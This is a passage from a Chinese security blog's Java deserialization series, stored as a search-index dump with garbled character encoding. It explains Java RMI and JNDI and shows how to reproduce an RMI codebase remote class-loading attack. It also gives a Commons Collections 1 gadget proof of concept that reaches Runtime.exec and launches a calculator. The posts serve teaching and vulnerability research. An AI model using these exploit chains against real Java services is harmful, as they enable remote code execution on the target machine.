java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.server.UnicastRemoteObject; public class RMIServer { public interface IRemoteHelloWorld extends Remote { public String hello() throws RemoteException; } public class RemoteHelloWorld extends UnicastRemoteObject implements RMIServer.IRemoteHelloWorld { protected RemoteHelloWorld() throws RemoteException { super(); } @Override public String hello() throws RemoteException { return \"Hello World\"; } } private void start() throws Exception { RemoteHelloWorld h = new RemoteHelloWorld(); // åˆ›å»ºå¹¶è¿è¡Œ RMI Registry LocateRegistry.createRegistry(1099); // å°† RemoteHelloWorld å¯¹è±¡ç»‘å®šåˆ° Hello è¿™ä¸ªåå­—ä¸Š Naming.rebind(\"rmi://127.0.0.1:1099/Hello\", h); } public static void main(String[] args) throws Exception { new RMIServer().start(); } } ä¸Šé¢æåˆ°è¿‡ï¼Œâ¼€ä¸ª RMI Server åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š â¼€ä¸ªç»§æ‰¿ï¦º java.rmi.Remote çš„æ¥å£ï¼Œå…¶ä¸­å®šä¹‰è¦è¿œç¨‹è°ƒâ½¤çš„å‡½æ•°ï¼Œâ½å¦‚ä¸Šé¢çš„ hello() â¼€ä¸ªå®ç°äº†æ­¤æ¥â¼çš„ç±» â¼€ä¸ªä¸»ç±»ï¼Œâ½¤æ¥åˆ›å»º Registryï¼Œå¹¶å°†ä¸Šé¢çš„ç±»å®ä¾‹åŒ–åç»‘å®šåˆ°ä¸€ä¸ªåœ°å€ï¼Œå³ Serverã€‚ åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä»£ç é‡Œï¼Œå°† Registry ä¸ Server åˆå¹¶åˆ°ä¸€èµ·ã€‚ Naming.bind çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª URLï¼Œå½¢å¦‚ï¼šrmi://host:port/name ã€‚å…¶ä¸­ï¼Œ host å’Œ port å°±æ˜¯ RMI Registry çš„åœ°å€å’Œç«¯å£ï¼Œname æ˜¯è¿œç¨‹å¯¹è±¡çš„åå­—ã€‚ ä¿¡æ¯ å¦‚æœ RMI Registry åœ¨æœ¬åœ°è¿è¡Œï¼Œé‚£ä¹ˆ host å’Œ port æ˜¯å¯ä»¥çœç•¥çš„ï¼Œæ­¤æ—¶ host é»˜è®¤æ˜¯ localhostï¼Œport é»˜è®¤æ˜¯ 1099ã€‚ Naming.bind(\"Hello\", newRemoteHelloWorld()); 1.2.2 RMI Client package com.geekby.javarmi; import java.rmi.Naming; public class RMIClient { public static void main(String[] args) throws Exception { RMIServer.IRemoteHelloWorld hello = (RMIServer.IRemoteHelloWorld) Naming.lookup(\"rmi://127.0.0.1:1099/Hello\"); String ret = hello.hello(); System.out.println(ret); } } å®¢æˆ·ç«¯ä½¿ç”¨ Naming.lookup åœ¨ Registry ä¸­å¯»æ‰¾åˆ°åå­—æ˜¯ Hello çš„å¯¹è±¡ï¼Œåâ¾¯çš„ä½¿â½¤ç”¨å°±å’Œåœ¨æœ¬åœ°ä½¿ç”¨æ˜¯ä¸€è‡´çš„ã€‚ è™½ç„¶æ‰§â¾è¿œç¨‹â½…æ³•çš„æ—¶å€™ä»£ç æ˜¯åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§ï¨ˆçš„ï¼Œä½†å®¢æˆ·ç«¯è¿˜æ˜¯éœ€è¦çŸ¥é“æœ‰å“ªäº›â½…æ³•ï¼Œè¿™æ—¶å€™æ¥å£çš„é‡è¦æ€§å°±ä½“ç°ï¦ºï¼Œè¿™ä¹Ÿæ˜¯ä¸ºï§½ä¹ˆæˆ‘ä»¬å‰é¢è¦ç»§æ‰¿ Remote å¹¶å°†éœ€è¦è°ƒâ½¤çš„æ–¹æ³•å†™åœ¨æ¥â¼ IRemoteHelloWorld ï§©ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¹Ÿéœ€è¦â½¤åˆ°è¿™ä¸ªæ¥â¼ã€‚ é€šè¿‡ wireshark æŠ“åŒ…ï¼Œè§‚å¯Ÿé€šä¿¡è¿‡ç¨‹ï¼š æ•´ä¸ªè¿‡ç¨‹è¿›â¾äº†ä¸¤æ¬¡ TCP æ¡æ‰‹ï¼Œä¹Ÿå°±æ˜¯å®é™…å»ºâ½´äº†ä¸¤æ¬¡ TCP è¿æ¥ã€‚ ç¬¬â¼€æ¬¡å»ºç«‹ TCP è¿æ¥æ˜¯å®¢æˆ·ç«¯è¿æ¥æœåŠ¡ç«¯çš„ 1099 ç«¯â¼ï¼Œâ¼†è€…è¿›ï¨ˆåå•†åï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€äº†â¼€ä¸ª Call æ¶ˆæ¯ï¼ŒæœåŠ¡ç«¯å›å¤äº†ä¸€ä¸ª ReturnData æ¶ˆæ¯ï¼Œç„¶åå®¢æˆ·ç«¯æ–°å»ºï¦ºâ¼€ä¸ª TCP è¿æ¥ï¼Œè¿åˆ°è¿œç«¯çš„ 51388 ç«¯å£ã€‚ æ•´ä¸ªè¿‡ç¨‹ï¼Œâ¾¸å…ˆå®¢æˆ·ç«¯è¿æ¥ Registryï¼Œå¹¶åœ¨å…¶ä¸­å¯»æ‰¾ Name æ˜¯ Hello çš„å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹åº”æ•°æ®æµä¸­çš„ Call æ¶ˆæ¯ã€‚ç„¶åï¼ŒRegistry è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„æ•°æ®ï¼Œå°±æ˜¯æ‰¾åˆ°çš„ Name=Hello çš„å¯¹è±¡ï¼Œå¯¹åº”æ•°æ®æµä¸­çš„ ReturnData æ¶ˆæ¯ã€‚å®¢æˆ·ç«¯ååºåˆ—åŒ–è¯¥å¯¹è±¡ï¼Œå‘ç°è¯¥å¯¹è±¡æ˜¯â¼€ä¸ªè¿œç¨‹å¯¹è±¡ï¼Œåœ°å€åœ¨ IP:port ï¼Œäºæ˜¯å†ä¸è¿™ä¸ª socket åœ°å€å»ºâ½´ TCP è¿æ¥ã€‚åœ¨æ–°çš„è¿æ¥ä¸­ï¼Œæ‰æ˜¯çœŸæ­£çš„æ‰§è¡Œè¿œç¨‹â½…æ³•ï¼Œä¹Ÿå°±æ˜¯ hello()ã€‚ ä¿¡æ¯ RMI Registry å°±åƒä¸€ä¸ªâ½¹å…³ï¼Œå…¶è‡ªèº«æ˜¯ï¥§ä¼šæ‰§ï¨ˆè¿œç¨‹æ–¹æ³•çš„ï¼Œä½† RMI Server å¯ä»¥åœ¨ä¸Šâ¾¯æ³¨å†Œâ¼€ä¸ª Name åˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»ã€‚RMI Client é€šè¿‡ Name å‘ RMI Registry æŸ¥è¯¢ï¼Œå¾—åˆ°è¿™ä¸ªç»‘å®šå…³ç³»ï¼Œç„¶åå†è¿æ¥ RMI Serverã€‚æœ€åï¼Œè¿œç¨‹æ–¹æ³•å®é™…ä¸Šåœ¨ RMI Server ä¸Šè°ƒâ½¤ã€‚ ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.3 æ”»å‡»é¢ å½“æ”»å‡»è€…å¯ä»¥è®¿é—®ç›®æ ‡ RMI Registry çš„æ—¶å€™ï¼Œä¼šæœ‰å“ªäº›å®‰å…¨é—®é¢˜å‘¢? é¦–å…ˆï¼ŒRMI Registry æ˜¯ä¸€ä¸ªè¿œç¨‹å¯¹è±¡ç®¡ç†çš„åœ°æ–¹ï¼Œå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªè¿œç¨‹å¯¹è±¡çš„â€œåå°â€ã€‚å¯ä»¥å°è¯•ç›´æ¥è®¿é—®â€œåå°â€åŠŸèƒ½ï¼Œæ¯”å¦‚ä¿®æ”¹è¿œç¨‹æœåŠ¡å™¨ä¸Š Hello å¯¹åº”çš„å¯¹è±¡ï¼Œä½†æ˜¯ï¼ŒJava å¯¹è¿œç¨‹è®¿é—® RMI Registry åšäº†é™åˆ¶ï¼Œåªæœ‰æ¥æºåœ°å€æ˜¯ localhost çš„æ—¶å€™ï¼Œæ‰èƒ½è°ƒç”¨ rebindã€ bindã€unbind ç­‰æ–¹æ³•ã€‚ ä¸è¿‡ï¼Œlist å’Œ lookup æ–¹æ³•å¯ä»¥è¿œç¨‹è°ƒç”¨ã€‚ 1.3.1 RMI åˆ©ç”¨ codebase æ‰§è¡Œä»»æ„ä»£ç  æ›¾ç»æœ‰æ®µæ—¶é—´ï¼ŒJava æ˜¯å¯ä»¥è¿è¡Œåœ¨æµè§ˆå™¨ä¸­çš„ã€‚åœ¨ä½¿ç”¨ Applet çš„æ—¶å€™é€šå¸¸éœ€è¦æŒ‡å®šä¸€ä¸ª codebase å±æ€§ï¼Œæ¯”å¦‚ï¼š \u003capplet code=\"HelloWorld.class\" codebase=\"Applets\" width=\"800\" height=\"600\"\u003e \u003c/applet\u003e é™¤äº†Appletï¼ŒRMI ä¸­ä¹Ÿå­˜åœ¨è¿œç¨‹åŠ è½½çš„åœºæ™¯ï¼Œä¹Ÿä¼šæ¶‰åŠåˆ° codebaseã€‚ codebase æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå‘Šè¯‰ Java è™šæ‹Ÿæœºè¯¥ä»å“ªä¸ªåœ°æ–¹å»æœç´¢ç±»ã€‚ å¦‚æœæŒ‡å®š codebase=http://geekby.site/ ï¼Œç„¶ååŠ è½½ org.example.Example ç±»ï¼Œåˆ™ Java è™šæ‹Ÿæœºä¼šä¸‹è½½è¿™ä¸ªæ–‡ä»¶ http://geekby.site/org/example/Example.class ï¼Œå¹¶ä½œä¸º Example ç±»çš„å­—èŠ‚ç ã€‚ RMI çš„æµç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´ä¼ é€’çš„æ˜¯ä¸€äº›åºåˆ—åŒ–åçš„å¯¹è±¡ï¼Œè¿™äº›å¯¹è±¡åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå°±ä¼šå»å¯»æ‰¾ç±»ã€‚å¦‚æœæŸä¸€ç«¯ååºåˆ—åŒ–æ—¶å‘ç°ä¸€ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆå°±ä¼šå»è‡ªå·±çš„ CLASSPATH ä¸‹å¯»æ‰¾ç›¸å¯¹åº”çš„ç±»ï¼›å¦‚æœåœ¨æœ¬åœ°æ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªç±»ï¼Œå°±ä¼šå»è¿œç¨‹åŠ è½½ codebase ä¸­çš„ç±»ã€‚ å¦‚æœ codebase è¢«æ§åˆ¶ï¼Œå°±å¯ä»¥åŠ è½½æ¶æ„ç±»ã€‚åœ¨ RMI ä¸­ï¼Œå¯ä»¥å°† codebase éšç€åºåˆ—åŒ–æ•°æ®ä¸€èµ·ä¼ è¾“çš„ï¼ŒæœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°è¿™ä¸ªæ•°æ®åå°±ä¼šå» CLASSPATH å’ŒæŒ‡å®šçš„ codebase å¯»æ‰¾ç±»ï¼Œç”±äº codebase è¢«æ§åˆ¶å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ å®˜æ–¹é€šè¿‡å¦‚ä¸‹æ–¹å¼è§£å†³äº†è¯¥å®‰å…¨é—®é¢˜ï¼š å®‰è£…å¹¶é…ç½®äº† SecurityManager Java ç‰ˆæœ¬ä½äº 7u21ã€6u45ï¼Œæˆ–è€…è®¾ç½®äº†java.rmi.server.useCodebaseOnly å®˜æ–¹å°† java.rmi.server.useCodebaseOnly çš„é»˜è®¤å€¼ç”± false æ”¹ä¸ºäº† true ã€‚åœ¨ java.rmi.server.useCodebaseOnly é…ç½®ä¸º true çš„æƒ…å†µä¸‹ï¼ŒJava è™šæ‹Ÿæœºå°†åªä¿¡ä»»é¢„å…ˆé…ç½®å¥½çš„ codebase ï¼Œä¸å†æ”¯æŒä» RMI è¯·æ±‚ä¸­è·å–ã€‚ é€šè¿‡åˆ›å»º 4 ä¸ªæ–‡ä»¶ï¼Œè¿›è¡Œæ¼æ´å¤ç°ï¼š ICalc.java import java.rmi.Remote; import java.rmi.RemoteException; import java.util.List; public interface ICalc extends Remote { public Integer sum(List\u003cInteger\u003e params) throws RemoteException; } Calc.java import java.rmi.RemoteException; import java.util.List; import java.rmi.server.UnicastRemoteObject; public class Calc extends UnicastRemoteObject implements ICalc { public Calc() throws RemoteException {} public Integer sum(List\u003cInteger\u003e params) throws RemoteException { Integer sum = 0; for (Integer param : params) { sum += param; } return sum; } } RemoteRMIServer.java import java.rmi.Naming; import java.rmi.registry.LocateRegistry; public class RemoteRMIServer { private void start() throws Exception { if (System.getSecurityManager() == null) { System.out.println(\"setup SecurityManager\"); System.setSecurityManager(new SecurityManager()); } Calc h = new Calc(); LocateRegistry.createRegistry(1099); Naming.rebind(\"refObj\", h); } public static void main(String[] args) throws Exception { new RemoteRMIServer().start(); } } Client.policy grant { permission java.security.AllPermission; }; ç¼–è¯‘åŠè¿è¡Œï¼š javac *.java java -Djava.rmi.server.hostname=10.28.178.250 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer RMIClient.javaï¼š import java.rmi.Naming; import java.util.List; import java.util.ArrayList; import java.io.Serializable; public class RMIClient implements Serializable { public class Payload extends ArrayList\u003cInteger\u003e {} public void lookup() throws Exception { ICalc r = (ICalc) Naming.lookup(\"rmi://10.28.178.250:1099/refObj\"); List\u003cInteger\u003e li = new Payload(); li.add(3); li.add(4); System.out.println(r.sum(li)); } public static void main(String[] args) throws Exception { new RMIClient().lookup(); } } è¿™ä¸ª Client éœ€è¦åœ¨å¦ä¸€ä¸ªä½ç½®è¿è¡Œï¼Œéœ€è¦è®© RMI Server åœ¨æœ¬åœ° CLASSPATH é‡Œæ‰¾ä¸åˆ°ç±»ï¼Œæ‰ä¼šå»åŠ è½½ codebase ä¸­çš„ç±»ï¼Œæ‰€ä»¥ä¸èƒ½å°† RMIClient.java æ”¾åœ¨ RMI Server æ‰€åœ¨çš„ç›®å½•ä¸­ã€‚ è¿è¡Œ RMIClientï¼š java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient åªéœ€è¦ç¼–è¯‘ä¸€ä¸ªæ¶æ„ç±»ï¼Œå°†å…¶ class æ–‡ä»¶æ”¾ç½®åœ¨ Web æœåŠ¡å™¨çš„ /RMIClient$Payload.class å³å¯ã€‚ ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:1:3","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 JNDI JNDI (Java Naming and Directory Interface) ï¼ŒåŒ…æ‹¬ Naming Service å’Œ Directory Serviceã€‚JNDI æ˜¯ Java APIï¼Œå…è®¸å®¢æˆ·ç«¯é€šè¿‡åç§°å‘ç°å’ŒæŸ¥æ‰¾æ•°æ®ã€å¯¹è±¡ã€‚è¿™äº›å¯¹è±¡å¯ä»¥å­˜å‚¨åœ¨ä¸åŒçš„å‘½åæˆ–ç›®å½•æœåŠ¡ä¸­ï¼Œä¾‹å¦‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ï¼Œå…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼ˆCORBAï¼‰ï¼Œè½»å‹ç›®å½•è®¿é—®åè®®ï¼ˆLDAPï¼‰æˆ–åŸŸåæœåŠ¡ï¼ˆDNSï¼‰ã€‚ ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 JNDI ç»„æˆ Nameing Service å‘½åæœåŠ¡ï¼Œå‘½åæœåŠ¡å°†å‘½ååç§°å’Œå¯¹è±¡è¿›è¡Œå…³è”ï¼Œæä¾›é€šè¿‡åç§°æ‰¾åˆ°å¯¹è±¡çš„æ“ä½œ Name åç§°ï¼Œè¦åœ¨å‘½åç³»ç»Ÿä¸­æŸ¥æ‰¾å¯¹è±¡ï¼Œéœ€è¦æä¾›å¯¹è±¡çš„åç§° Binding ç»‘å®šï¼Œä¸€ä¸ªåç§°å’Œä¸€ä¸ªå¯¹è±¡çš„å…³é“¾ç§°ä¸ºä¸€ä¸ªç»‘å®š Reference å¼•ç”¨ï¼Œåœ¨ä¸€äº›å‘½åæœåŠ¡ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿå¹¶ä¸æ˜¯ç›´æ¥å°†å¯¹è±¡å­˜å‚¨åœ¨ç³»ç»Ÿä¸­ï¼Œè€Œæ˜¯ä¿æŒå¯¹è±¡çš„å¼•ç”¨ ä¸Šä¸‹æ–‡ ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªä¸Šä¸‹æ–‡æ˜¯ä¸€ç³»åˆ—åç§°å’Œå¯¹è±¡çš„ç»‘å®šçš„é›†åˆ ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒ Java ä¸­ RMIã€JNDIã€LDAPã€JRMPã€JMXã€JMSé‚£äº›äº‹å„¿ phith0n Java æ¼«è°ˆç³»åˆ— ","date":"2021-08-29","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-3","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Commons Collections 1, 2, 4, 6 Gadget åˆ†æ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Java ååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2 ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 èƒŒæ™¯ä»‹ç» ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 Commons Collections Apache Commons æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šçš„é¡¹ç›®ã€‚Commons Collections åŒ…ä¸º Java æ ‡å‡†çš„ Collections API æä¾›äº†ç›¸å½“å¥½çš„è¡¥å……ã€‚åœ¨æ­¤åŸºç¡€ä¸Šå¯¹å…¶å¸¸ç”¨çš„æ•°æ®ç»“æ„æ“ä½œè¿›è¡Œäº†å¾ˆå¥½çš„å°è£…ã€æŠ½è±¡å’Œè¡¥å……ã€‚è®©æˆ‘ä»¬åœ¨å¼€å‘åº”ç”¨ç¨‹åºçš„è¿‡ç¨‹ä¸­ï¼Œæ—¢ä¿è¯äº†æ€§èƒ½ï¼ŒåŒæ—¶ä¹Ÿèƒ½å¤§å¤§ç®€åŒ–ä»£ç ã€‚ ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:1:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 Java ä»£ç† ç±»ä¼¼äº python ä¸­è£…é¥°å™¨çš„ä½œç”¨ï¼ŒJava ä¸­çš„ä»£ç†ï¼Œå°±æ˜¯ä»£ç†ç±»ä¸ºè¢«ä»£ç†ç±»é¢„å¤„ç†æ¶ˆæ¯ã€è¿‡æ»¤æ¶ˆæ¯å¹¶åœ¨æ­¤ä¹‹åå°†æ¶ˆæ¯è½¬å‘ç»™è¢«ä»£ç†ç±»ï¼Œä¹‹åè¿˜èƒ½è¿›è¡Œæ¶ˆæ¯çš„åç½®å¤„ç†ã€‚ä»£ç†ç±»å’Œè¢«ä»£ç†ç±»é€šå¸¸ä¼šå­˜åœ¨å…³è”å…³ç³»ï¼Œä»£ç†ç±»æœ¬èº«ä¸å®ç°æœåŠ¡ï¼Œè€Œæ˜¯é€šè¿‡è°ƒç”¨è¢«ä»£ç†ç±»ä¸­çš„æ–¹æ³•æ¥æä¾›æœåŠ¡ã€‚ 1.2.1 é™æ€ä»£ç† åˆ›å»ºä¸€ä¸ªæ¥å£ï¼Œå†åˆ›å»ºè¢«ä»£ç†çš„ç±»å®ç°è¯¥æ¥å£å¹¶ä¸”å®ç°è¯¥æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•ã€‚ä¹‹åå†åˆ›å»ºä¸€ä¸ªä»£ç†ç±»ï¼ŒåŒæ—¶ä½¿å…¶ä¹Ÿå®ç°è¿™ä¸ªæ¥å£ã€‚åœ¨ä»£ç†ç±»ä¸­æŒæœ‰ä¸€ä¸ªè¢«ä»£ç†å¯¹è±¡çš„å¼•ç”¨ï¼Œè€Œååœ¨ä»£ç†ç±»æ–¹æ³•ä¸­è°ƒç”¨è¯¥å¯¹è±¡çš„æ–¹æ³•ã€‚ æ¥å£ï¼š public interface HelloInterface { void sayHello(); } è¢«ä»£ç†ç±»ï¼š public class Hello implements HelloInterface{ @Override public void sayHello() { System.out.println(\"Hello World!\"); } } ä»£ç†ç±»ï¼š public class HelloProxy implements HelloInterface{ private HelloInterface helloInterface = new Hello(); @Override public void sayHello() { System.out.println(\"Before invoke sayHello\" ); helloInterface.sayHello(); System.out.println(\"After invoke sayHello\"); } } ä»£ç†ç±»è°ƒç”¨ï¼š public static void main(String[] args) { HelloProxy helloProxy = new HelloProxy(); helloProxy.sayHello(); } è¾“å‡ºï¼š Before invoke sayHello Hello World! After invoke sayHello ä½¿ç”¨é™æ€ä»£ç†å¾ˆå®¹æ˜“å°±å®Œæˆäº†å¯¹ä¸€ä¸ªç±»çš„ä»£ç†æ“ä½œã€‚ä½†æ˜¯é™æ€ä»£ç†çš„ç¼ºç‚¹ä¹Ÿå¤§ï¼šç”±äºä»£ç†åªèƒ½ä¸ºä¸€ä¸ªç±»æœåŠ¡ï¼Œå¦‚æœéœ€è¦ä»£ç†çš„ç±»å¾ˆå¤šï¼Œé‚£ä¹ˆå°±éœ€è¦ç¼–å†™å¤§é‡çš„ä»£ç†ç±»ï¼Œæ¯”è¾ƒç¹çã€‚å› æ­¤ï¼Œæå‡ºäº†åŠ¨æ€ä»£ç†çš„æ¦‚å¿µã€‚ 1.2.2 åŠ¨æ€ä»£ç† åˆ©ç”¨åå°„æœºåˆ¶åœ¨è¿è¡Œæ—¶åˆ›å»ºä»£ç†ç±»ã€‚ æ¥å£ã€è¢«ä»£ç†ç±»ä¸å˜ï¼Œé€šè¿‡æ„å»º handler ç±»æ¥å®ç° InvocationHandler æ¥å£ã€‚ public class ProxyHandler implements InvocationHandler{ private Object object; public ProxyHandler(Object object){ this.object = object; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(\"Before invoke \" + method.getName()); method.invoke(object, args); System.out.println(\"After invoke \" + method.getName()); return null; } } æ‰§è¡ŒåŠ¨æ€ä»£ç†ï¼š public static void main(String[] args) { System.getProperties().setProperty(\"sun.misc.ProxyGenerator.saveGeneratedFiles\", \"true\"); HelloInterface hello = new Hello(); InvocationHandler handler = new ProxyHandler(hello); HelloInterface proxyHello = (HelloInterface) Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), handler); proxyHello.sayHello(); } è¾“å‡ºï¼š Before invoke sayHello Hello zhanghao! After invoke sayHello ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:1:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 CommonsCollections 1 Gadget åˆ†æ ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 è°ƒç”¨é“¾ ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() MapEntry.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:1","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.2 POC Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\"test\", \"Geekby\"); ","date":"2021-08-26","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/:2:2","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-2","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.3 åˆ†æ 2.3.1 æ•´ä½“æ€è·¯ cc1 gadget çš„ sink ç‚¹åœ¨äº InvokerTransformer ç±»å¯ä»¥é€šè¿‡ä¼ å…¥æ–¹æ³•åï¼Œæ–¹æ³•å‚æ•°ç±»å‹ã€æ–¹æ³•å‚æ•°ï¼Œåˆ©ç”¨åå°„æœºåˆ¶ï¼Œè¿›è¡Œæ–¹æ³•è°ƒç”¨ã€‚ åå‘å¯»æ‰¾ä½¿ç”¨äº† InvokerTransformer ç±»ä¸­ transform æ–¹æ³•çš„è°ƒç”¨ç‚¹ï¼š å‘ç° TransformedMap ç±»ä¸­çš„ checkSetValue æ–¹æ³•ä¸­è°ƒç”¨äº† transform æ–¹æ³• protected Object checkSetValue(Object value) { return valueTransformer.transform(value); } åœ¨ TransformedMap ç±»çš„æˆå‘˜ä¸­ï¼Œå‘ç° protected final Transformer valueTransformer 